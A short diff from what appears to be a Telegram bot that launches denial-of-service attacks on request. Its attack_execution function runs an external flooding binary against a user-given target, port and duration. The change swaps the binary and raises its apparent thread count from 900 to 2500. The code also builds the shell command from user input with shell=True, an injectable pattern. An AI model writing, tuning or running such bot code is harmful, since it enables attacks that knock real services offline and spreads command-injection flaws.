@@ -99,7 +99,7 @@ def handle_attack(message):
     # ✅ Attack Execution Function
     def attack_execution():
         try:
-            subprocess.run(f"./megoxer {target} {port} {time_duration} 900", shell=True, check=True, timeout=time_duration)
+            subprocess.run(f"./soul {target} {port} {time_duration} 2500", shell=True, check=True, timeout=time_duration)
         except subprocess.CalledProcessError:
             bot.reply_to(message, "❌ **ATTACK FAIL HO GAYA!**")
         finally:
